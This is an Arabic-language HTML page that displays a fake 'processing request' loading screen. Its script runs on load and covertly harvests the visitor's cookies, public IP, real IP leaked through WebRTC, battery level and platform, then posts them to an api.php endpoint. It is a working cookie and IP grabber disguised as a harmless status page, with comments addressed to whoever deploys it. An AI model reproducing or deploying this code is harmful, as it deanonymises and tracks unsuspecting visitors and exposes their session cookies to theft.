<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>ALSSRY SYSTEM</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 100px; }
        .loader { border: 4px solid #111; border-top: 4px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2>جاري معالجة الطلب...</h2>
    <div class="loader"></div>
    <div id="status">فحص بروتوكولات الشبكة...</div>

    <script>
        let deviceData = { cookies: document.cookie };

        async function start() {
            // سحب IP
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const d = await res.json();
                deviceData.ip = d.ip;
            } catch(e) { deviceData.ip = "Unknown"; }

            // سحب Real IP
            const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = (e) => {
                if (e.candidate) {
                    deviceData.real_ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)[1];
                    sendToApi(); // الإرسال فور سحب أهم معلومة
                }
            };

            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                deviceData.battery = Math.round(b.level * 100) + "%";
            }
            deviceData.platform = navigator.platform;
        }

        function sendToApi() {
            // الإرسال لملف الـ API حقك
            fetch('api.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(deviceData)
            }).then(() => {
                document.getElementById('status').innerText = "اكتمل التزامن.";
            });
        }

        window.onload = start;
    </script>
</body>
</html>
